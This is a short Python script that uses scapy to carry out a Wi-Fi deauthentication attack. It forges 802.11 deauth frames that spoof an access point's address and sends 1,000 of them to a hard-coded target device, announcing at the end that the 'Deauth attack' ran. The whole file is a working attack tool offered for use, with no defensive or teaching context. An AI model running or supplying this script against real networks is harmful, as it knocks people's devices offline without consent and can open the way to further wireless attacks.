from scapy.all import *
import os

def deauth(target_mac, gateway_mac, interface):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # Stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # Send the packet
    sendp(packet, iface=interface, count=1000, inter=.1)

if __name__ == "__main__":
    # Interface that you want to send packets from, needs to be in monitor mode
    interface = "wlx24050fe36984"
    # The MAC address of the target device
    target_mac = "b8:31:b5:88:36:7c"
    # The MAC address of the access point
    gateway_mac = "44:48:c1:af:e1:d0"

    # Checking if running as root
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.")
    
    deauth(target_mac, gateway_mac, interface)
    print("Deauth attack executed. Check if the target has been disconnected.")
